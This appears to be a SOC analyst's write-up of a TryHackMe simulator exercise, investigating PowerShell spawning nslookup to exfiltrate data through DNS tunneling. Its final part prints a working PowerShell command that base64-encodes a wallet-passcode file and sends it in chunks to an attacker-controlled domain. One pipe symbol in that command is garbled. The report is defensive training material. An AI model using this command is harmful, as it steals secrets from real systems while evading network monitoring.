# Case 04 — PowerShell Data Exfiltration via DNS Tunneling (Alerts 1025–1034)

- **Environment:** TryHackMe SOC Simulator
- **Alert Rule:** `Suspicious Parent Child Relationship` (1025–1034)
- **Severity:** High
- **Classification:** True Positive (Active Data Exfiltration)

---

## Time of Activity
November 24, 2026, starting at `01:24:10` and continuing through `01:26` (multiple sequential `nslookup.exe` child processes spawned by `powershell.exe`).

## Affected Entities
- **Compromised Host:** `win-3450`
- **Affected User Account:** `SSF\michael.ascot`
- **Parent Process:** `powershell.exe` (PID `3728`)
- **Child Process:** `nslookup.exe` (e.g., PIDs `5520`, `3700`)

## Investigation & Analysis
Alerts 1025 through 1034 triggered on host `win-3450` due to an anomalous parent-child process relationship in which `powershell.exe` repeatedly spawned `nslookup.exe` instances within short intervals.

- **Threat Intelligence:** Lookup of `haz4rdw4re[.]io` on TryDetectThis returned no prior malicious flags, indicating a newly registered or unindexed attacker-controlled domain.
- **Sysmon & PowerShell Log Correlation:** Inspecting Sysmon Event ID 1 (`Process Create`) and PowerShell `Pipeline Execution Details` logs on `win-3450` revealed the exact exfiltration command executed under user `SSF\michael.ascot` with `-ExecutionPolicy Bypass`:
  ```powershell
  $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"));
  $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } \vert{} ForEach-Object {Invoke-Expression "nslookup $_.haz4rdw4re.io"}
